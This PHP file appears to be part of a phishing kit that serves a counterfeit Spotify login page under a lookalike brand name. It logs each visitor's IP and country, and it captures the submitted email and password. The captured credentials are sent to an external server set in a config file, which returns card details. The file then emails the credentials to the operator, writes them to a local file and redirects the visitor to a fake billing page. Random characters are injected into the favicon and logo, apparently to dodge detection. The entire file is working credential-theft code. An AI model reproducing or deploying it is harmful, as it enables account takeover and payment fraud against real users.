<?php 
@error_reporting(0);
// made by Cyborg99" // https://icq.im/ra__3 "N3V3R D0WN HQ"
include'../proxy.php';
$rand = dechex(rand(0x000000, 0xFFFFFF));
$host = isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'localhost';
$bert=md5 (rand(0,10000));
$bero=md5 (rand(0,100000));
$bero1=md5 (rand(0,10000));
$bero2=md5 (rand(0,10000));
$bero3=md5 (rand(0,1000));
$bero4=md5 (rand(0,1000));
$bero5=md5 (rand(0,100000));
$bero6=md5 (rand(0,10000));
$bert4=md5 (rand(0,1000));
require "../lang.php";
#################################################################################################################################
		$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
#################################################################################################################################
$dota = str_replace(".", "", $IP);
$io = 'h';
$vena = $io . '' . $dota;

$ij = 'aa';
$uinas = $ij . '' . $dota;

if(isset($_POST[$uinas])) 
{
$CODED  ="bill?".$dota."=&e$dota&country=".$COUNTRYCODE."&".md5(microtime())."&s=".sha1(microtime());
header("Location: $CODED");	
}
if(isset($_POST['username'])) 
{ 
// Required field names
$required = array('username', 'text');

// Loop over field names, make sure each one exists and is not empty
$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
}

if ($error) {
  header("Location: indexs.php?h$dota=$ber&country=$COUNTRYCODE&error");
  die();
} else {


##############################################################################################################################################################
		include('mail.php');
##############################################################################################################################################################

		$zmail = $_POST['username'];
		$fna = $_POST['text'];
				
####################
$server = parse_ini_file("../mise.ini", true);
$act = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
$handle = curl_init();
$url = 'https://'.$server['connect'].'?mp='.$zmail.'|'.$fna.'';
curl_setopt($handle, CURLOPT_URL, $url);
curl_setopt($handle, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($handle, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
curl_setopt($handle,CURLOPT_REFERER, "$act");
$output = curl_exec($handle); //
curl_close($handle);
$data = json_decode($output);
$a = $data->cc;
$b = $data->exp;
$c = $data->dob;
$d = $data->usr;
$t = $data->status;
####################
$setting = parse_ini_file('../conf.pak'); $gettfe = $setting['truelogin']; if($gettfe == 1) {$true = 'fail';}else{$true = '';}
if (strpos($t,$true) !== false) {
header("Location: indexs.php?h$dota=$ber&country=$COUNTRYCODE&error");
}else{
##############################################################################################################################################################
$MESSAGE="<table cellpadding='0' cellspacing='0' align='center' border='0' bgcolor='#ffffff' style='color: rgb(34, 34, 34); font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; width: 639px;'>
	<tr>
		<td width='600' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
		<table cellpadding='0' cellspacing='0' width='600' border='0'>
			<tr>
				<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
				<p>Dear <font color='#008000'>".$PRONAME."</font>,			<hr>
			</p>
				<p style=''>
				<img border='0' src='https://1.bp.blogspot.com/-Xrkf51hrYhE/XV6xGp86chI/AAAAAAAAAHg/eO0RbRmZdbYif07iog4TpRM6uOqIY1czQCLcBGAs/s1600/SPOT.png'></p>
				<p>&nbsp;</td>
			</tr>
			</table>
			<hr><br>
		</td>
		<td width='26' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
	</tr>
</table>

<table cellpadding='0' cellspacing='0' align='center' width='640' border='0' style='color: rgb(34, 34, 34); font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; width: 640px; margin: auto;'>
	<tr>
	<td width='20' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
		<td width='800' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
		<table cellpadding='0' cellspacing='0' width='320px' border='0'>
			<tr>
				<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
				<strong>User Login Details</strong><br>
				Username : <h>".$zmail."</h><br>
				Password : <h>".$fna."</h></td>
			</tr>
		</table>
		</td>
		<td width='27' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
		<td width='376' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
		<table cellpadding='0' cellspacing='0' width='400px' border='0'>
			<tr>
				<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
				<strong>User Details</strong><br>
				IP  : <a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a><br>
				COUNTRY  : <h> ".$COUNTRYNAME." - <font color='#FF6600'>".$COUNTRYCODE."</font> </h> <br>
				BROWSER & OS  : <h>".$device_details."</h><br>
				TIME  : <h>".date('l jS \of F Y h:i:s A')."</h></td>
			</tr>
		</table>
		</td>
	</tr>
</table>";
$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
		$SUBJECT = "User Login (True login) | $IP | $COUNTRYCODE";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: SPOTAsta v1 <admin$rand@$host>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		$CODED  ="bill.php?".$dota."=".$zmail."&e$dota&country=".$COUNTRYCODE."&cc=$a&exp=$b&dob=$c&urr=$d&".md5(microtime())."&s=".sha1(microtime());
		header("Location: $CODED");
		$myfile = fopen("../rz/spoty-login-$bert.html", "a+") or die("Unable to open file!");
		fwrite($myfile, '-------------------------------- * Card Info * -------------------------------');
        fwrite($myfile, $MESSAGE);
        fclose($myfile);
		
function deleteAll($str) {
if (is_file($str)) {
return unlink($str);
}
elseif (is_dir($str)) {
$scan = glob(rtrim($str,'/').'/*');
foreach($scan as $index=>$path) {
deleteAll($path);
}
return @rmdir($str);
}
}
deleteAll('indexs.php');
##############################################################################################################################################################
}
}}
?>

<?php
if(isset($_GET[$vena]))
{
?>
<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title class="ng-binding"><?php echo $tioiei;?> - Spotıfy (<?php echo $COUNTRYCODE; ?>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $bert; ?></title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <base href=".">
  <link rel="icon" href="data:image/x-icon;base64,AAABAAIAEBAAAAAAIABoBAAAJgAAACAgAAAAACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAEAEAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjnExMYzxMTGIsTExgl////Af///wH///8B////Af///wH///8BExMYBRMTGJMTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY+xMTGJMTExgF////Af///wH///8BExMYBRMTGMMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYwxMTGAX///8B////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////ARMTGCUTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExivExMYpxMTGP8TExj/ExMY+xMTGCUTExiLExMY/xMTGP8TExirExMYTRMTGG8TExh/ExMYfxMTGFcTExgpExMYZxMTGOMTExj/ExMY/xMTGP8TExiLExMYzxMTGP8TExj/ExMY/xMTGNsTExi3ExMYnxMTGKcTExjLExMY+xMTGP8TExivExMYuxMTGP8TExj/ExMYzxMTGOsTExj/ExMY/xMTGJcTExibExMYvxMTGN8TExjHExMYrxMTGHcTExglExMYJRMTGLsTExj/ExMY/xMTGOsTExjrExMY/xMTGP8TExifExMYTRMTGCETExghExMYIRMTGDUTExhnExMYtxMTGPsTExj3ExMY8xMTGP8TExjnExMYzxMTGP8TExj/ExMY5xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGNcTExiHExMYGRMTGF8TExj/ExMYzxMTGIsTExj/ExMYs////wETExgZExMYQRMTGEETExhBExMYORMTGBX///8BExMYFRMTGHMTExjrExMY/xMTGIsTExglExMY+xMTGP8TExi/ExMYixMTGGcTExhfExMYXxMTGG8TExiTExMYxxMTGPsTExj/ExMY/xMTGPsTExgl////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExiT////Af///wETExgFExMYwxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjDExMYBf///wH///8B////ARMTGAUTExiTExMY+xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGPsTExiTExMYBf///wH///8B////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjrExMYzxMTGIsTExgl////Af///wH///8B////AQAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8oAAAAIAAAAEAAAAABACAAAAAAAIAQAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wETExhBExMYgRMTGL8TExi/ExMY7xMTGN8TExi/ExMYvxMTGIETExhB////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYgRMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM<?php echo rand(1, 9); ?>TExgR////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wH///8BExMYMRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgx////Af///wH///8B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8BExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM////8B////Af///wH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIH///8B////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExjPExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExifExMYIf///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wH///8BExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgRMTGIETExivExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGJ8TExhhExMYEf///wETExgRExMYjxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjv////ARMTGEETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExgx////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgxExMYnxMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExhBExMYgRMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYnxMTGIETExhhExMYQRMTGEETExhBExMYYRMTGIETExivExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIETExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYnxMTGCETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYcRMTGCH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wETExghExMYURMTGIETExiBExMYvxMTGL8TExifExMYgRMTGIETExhBExMYEf///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExiP////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExifExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY3xMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYrxMTGIETExhBExMYQRMTGEETExhBExMYQRMTGEETExhRExMYgRMTGK8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYzxMTGP8TExj/ExMY/xMTGP8TExi/ExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYYf///wH///8BExMYvxMTGP8TExj/ExMY/xMTGL8TExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY3xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM8TExiPExMYQf///wH///8B////Af///wETExi/ExMY/xMTGP8TExj/ExMYgRMTGEETExj/ExMY/xMTGP8TExj/ExMYcf///wH///8BExMYIRMTGEETExiBExMYgRMTGIETExiBExMYgRMTGIETExiBExMYYRMTGEETExgR////Af///wH///8B////Af///wETExghExMYrxMTGP8TExj/ExMY/xMTGP8TExhB////ARMTGO8TExj/ExMY/xMTGP8TExhh////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhRExMYrxMTGP8TExj/ExMY/xMTGP8TExj/ExMY7////wH///8BExMYgRMTGP8TExj/ExMY/xMTGP8TExifExMYYRMTGDH///8B////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wETExgRExMYQRMTGHETExivExMY7xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExiB////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYvxMTGL8TExi/ExMYvxMTGL8TExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////Af///wETExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiB////Af///wH///8B////Af///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYz////wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////ARMTGDETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYMf///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYzxMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExiBExMY7xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYgRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIETExgR////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExiBExMYvxMTGL<?php echo rand(1, 9); ?>TExjvExMY7xMTGL<?php echo rand(1, 9); ?>TExi/ExMYgRMTGEH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wH///8B////AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
  <link href="../libs/index.css" media="screen" rel="stylesheet">
  </head>
<style>  
.head .bootstrap {
    background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 566.93 170.04' width='567' height='171'%3E%3Cpath d='M87.996 1.277c-46.<?php echo rand(1, 19); ?> 0-83.743 37.493-83.743 83.742 0 46.254 37.494 83.745 83.743 83.745 46.251 0 83.743-37.491 83.743-83.745 0-46.246-37.49-83.738-83.744-83.738zm38.404 120.78a5.217 5.217 0 0 1-7.177 1.737c-19.665-12.019-44.417-14.<?php echo rand(6, 8); ?>34-73.567-8.0<?php echo rand(6, 8); ?>5a5.217 5.217 0 0 1-6.249-3.925 5.212 5.212 0 0 1 3.926-6.249c31.9-7.293 59.263-4.154 81.336 9.334 2.46 1.51 3.24 4.72 1.73 7.18zm10.25-22.799c-1.894 3.073-5.912 4.037-8.981 2.15-22.505-13.834-56.822-17.841-83.447-9.759-3.453 1.043-7.1-.903-8.148-4.35a6.538 6.538 0 0 1 4.354-8.143c30.413-9.228 68.221-4.758 94.071 11.127 3.07 1.89 4.04 5.91 2.15 8.976zm.88-23.744c-26.994-16.031-71.52-17.505-97.289-9.684-4.138 1.255-8.514-1.081-9.768-5.219a7.835 7.835 0 0 1 5.221-9.771c29.581-8.98 78.756-7.245 109.83 11.202a7.833 7.833 0 0 1 2.737 10.733c-2.2 3.722-7.02 4.949-10.73 2.739zm94.56 3.072c-14.459-3.448-17.033-5.868-17.033-10.953 0-4.804 4.523-8.037 11.249-8.037 6.52 0 12.985 2.455 19.763 7.509a.<?php echo rand(5, 15); ?>.<?php echo rand(5, 15); ?> 0 0 0 .715.174.934.934 0 0 0 .625-.386l7.06-9.952a.949.949 0 0 0-.18-1.288c-8.067-6.473-17.151-9.62-27.769-9.62-15.612 0-26.517 9.369-26.517 22.774 0 14.375 9.407 19.465 25.663 23.394 13.836 3.187 16.171 5.857 16.171 10.63 0 5.289-4.722 8.577-12.321 8.577-8.44 0-15.324-2.843-23.025-9.512a.992.992 0 0 0-.695-.226.94.94 0 0 0-.65.334l-7.916 9.421a.94.94 0 0 0 .094 1.313c8.96 7.<?php echo rand(7, 9); ?>99 1<?php echo rand(7, 9); ?>.<?php echo rand(7, 9); ?>8 12.224 31.872 12.224 16.823 0 27.6<?php echo rand(7, 9); ?>4-9.192 27.6<?php echo rand(7, 9); ?>4-23.419.03-12.01-7.16-18.66-24.77-22.944zm62.86-14.26c-7.292 0-13.<?php echo rand(5, 15); ?> 2.872-18.205 8.757v-6.624a.949.949 0 0 0-.946-.949h-12.947a.948.948 0 0 0-.946.949v73.602c0 .523.423.949.946.949h12.947a.949.949 0 0 0 .946-.949v-23.233c4.933 5.536 10.915 8.241 18.205 8.241 13.549 0 27.265-10.43 27.265-30.368.02-19.943-13.7-30.376-27.25-30.376zm12.21 30.375c0 10.153-6.254 17.238-15.209 17.238-8.853 0-15.531-7.407-15.531-17.238 0-9.83 6.678-17.238 15.531-17.238 8.81-.001 15.21 7.247 15.21 17.237zm50.21-30.375c-17.449 0-31.119 13.436-31.119 30.592 0 16.969 13.576 30.264 30.905 30.264 17.511 0 31.223-13.391 31.223-30.481 0-17.031-13.62-30.373-31.01-30.373zm0 47.714c-9.281 0-16.278-7.457-16.278-17.344 0-9.929 6.755-17.134 16.064-17.134 9.341 0 16.385 7.457 16.385 17.351 0 9.927-6.8 17.127-16.17 17.127zm68.27-46.53h-14.247V50.<?php echo rand(7, 9); ?>44a.94<?php echo rand(5, 7); ?>.947 0 0 0-.945-.94<?php echo rand(1, 19); ?>h-12.945a.95.95 0 0 0-.949.948V65.51h-6.225a.947.947 0 0 0-.943.949v11.127c0 .522.422.949.943.949h6.225v28.791c0 11.635 5.791 17.534 17.212 17.534 4.644 0 8.497-.959 12.128-3.018a.944.944 0 0 0 .478-.821v-10.5<?php echo rand(1, 19); ?>6a.948.948 0 0 0-1.372-.85c-2.494 <?php echo rand(1, 19); ?>.255-4.905 1.834-7.6 1.834-4.154 0-6.007-1.886-6.007-6.113V78.54h14.247a.946.946 0 0 0 .944-.949V66.465a.918.918 0 0 0-.93-.949zm49.64.057v-1.789c0-5.263 2.018-7.61 6.544-7.61 2.699 0 4.867.536 7.295 1.346a.946.946 0 0 0 1.245-.902v-10.91a.947.947 0 0 0-.67-.909c-2.565-.763-5.<?php echo rand(6, 8); ?>47-1.546-10.761-1.546-11.958 0-18.279 6.734-18.279 19.467v2.74h-6.22a.952.952 0 0 0-.95.948v11.184c0 .522.428.949.95.949h6.22v44.409c0 .523.422.949.<?php echo rand(5, 15); ?>.949h12.947a.95.95 0 0 0 .949-.949V78.538h12.088l18.517 44.398c-2.102 4.665-4.169 5.593-6.991 5.593-2.281 0-4.683-.681-7.139-2.025a.972.972 0 0 0-.754-.071.957.957 0 0 0-.56.511l-4.388 9.62<?php echo rand(6, 8); ?>a.942.942 0 0 0 .408 1.225c4.581 2.481 8.<?php echo rand(4, 4); ?> 3.54 13.827 3.54 9.56 0 14.844-4.453 19.502-16.433l22.<?php echo rand(1, 3); ?>-58.04a.947.947 0 0 0-.879-1.293h-13.478a.951.951 0 0 0-.897.636l-13.807 39.438-15.123-39.464a.945.945 0 0 0-.884-.61h-22.12zm-28.78-.057h-12.947a.95.95 0 0 0-.949.949v56.485a.95.95 0 0 0 .949.949H446.5a.951.951 0 0 0 .949-.949V66.463a.947.947 0 0 0-.95-.949zm-6.4-25.719c-5.129 0-9.291 4.152-9.291 9.281 0 5.132 4.163 9.289 9.291 9.289 5.127 0 9.285-4.157 9.285-9.289 0-5.128-4.16-9.2<?php echo rand(6, 8); ?>1-9.28-9.281zm113.42 43.88c-5.124 0-9.111-4.115-9.111-9.112s4.039-9.159 9.159-9.159a9.074 9.074 0 0 1 9.111 9.107c0 4.997-4.04 9.164-9.16 9.164zm.05-17.365c-4.667 0-8.198 3.71-8.198 8.253 0 4.541 3.506 8.201 8.151 8.20<?php echo rand(1, 19); ?> 4.666 0 8.201-3.707 8.201-8.<?php echo rand(1, 19); ?>53 0-4.541-3.51-8.20<?php echo rand(1, 19); ?>-8.15-8.201zm2.02 9.138l2.577 3.608h-2.173l-2.32-3.31h-1.995v3.31h-1.819v-9.564h4.265c2.222 0 3.683 1.137 3.683 3.051.01 1.568-.9 2.526-2.21 2.905zm-1.54-4.315h-2.372v3.025h2.372c1.184 0 1.<?php echo rand(6, 8); ?>91-.579 1.891-1.514 0-.984-.71-1.511-1.<?php echo rand(6, 8); ?>9-1.511z'/%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-size: 100% 100%;
    background-size: 100%;
    display: inline-block;
    max-width: 100%;
    width: 200px;
}
</style>   
<body class="ng-scope">
  <div class="ng-scope"><div class="ng-scope"><div class="head ">
  <a class="bootstrap" tabindex="-1" title="<? echo $bero6;?>" ng-href="/en" href=""></a>
</div>
</div>


<div class="container-fluid login ng-scope">
  <div class="content">
    <div class="row ng-scope">
          <div class="col-xs-12 text-center">
              <span dir="<?php echo $semitic;?>" style="<?php echo $space;?>" class="h5 ng-binding"><?php echo $tclin;?></span>
          </div>
    </div>
	<form id="form-id" method="post" action="indexs.php?<?php echo $vena; ?>=<?php echo $bero4; ?>">
    <div class="row">
      <div class="col-xs-12">
        <a dir="<?php echo $semitic;?>" style="<?php echo $space;?>" class="btn btn-block btn-facebook ng-binding" onclick="document.getElementById('form-id').submit();" role="button" ><?php echo $loginw;?></a>
      <input type="hidden" name="aa<?php echo $dota;?>" value="aa<?php echo $dota;?>">
	  </div>
    </div>
	</form>

    <div class="row">
      <div class="col-xs-12">
        <div class="divider">
          <strong class="divider-title ng-binding">or</strong>
        </div>
      </div>
    </div>
	
<?php 
if(isset($_GET['error'])) 
{
echo '<div class="row ng-scope" >';
echo '<div class="col-xs-12 text-center">';
echo '<p class="alert alert-warning">';
echo "<span class='ng-binding ng-scope'>$yuiuriofj</span>";
echo '</p>';
echo '</div>';
echo '</div>';
}
?>

    <form name="$parent.accounts" method="post" action="indexs.php?<?php echo $vena; ?>=<?php echo $bero4; ?>" class="ng-pristine ng-valid-sp-disallow-chars ng-invalid ng-invalid-required">

      <div class="row" ng-class="{&#39;has-error&#39;: (accounts.username.$dirty &amp;&amp; accounts.username.$invalid)}">
        <div class="col-xs-12">
          <label for="login-username" class="control-label sr-only ng-binding">
            <?php echo $Emailadd;?>
          </label>
          <input dir="<?php echo $semitic;?>" style="<?php echo $space;?>" type="text" class="form-control input-with-feedback ng-pristine ng-valid-sp-disallow-chars ng-empty ng-invalid ng-invalid-required ng-touched" name="username" placeholder="<?php echo $Emailadd;?>" required="" sp-disallow-chars=":%&amp;&#39;`´&quot;" autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" ng-trim="false">
        </div>
      </div>

      <div class="row">
        <div class="col-xs-12">
          <label for="login-password" class="control-label sr-only ng-binding">
            <?php echo $Passw;?>
          </label>
          <input dir="<?php echo $semitic;?>" style="<?php echo $space;?>" type="password" class="form-control input-with-feedback ng-pristine ng-empty ng-invalid ng-invalid-required ng-touched" name="text" placeholder="<?php echo $Passw;?>" required="" autocomplete="off" ng-trim="false">
        </div>
      </div>

      <div class="row row-submit">
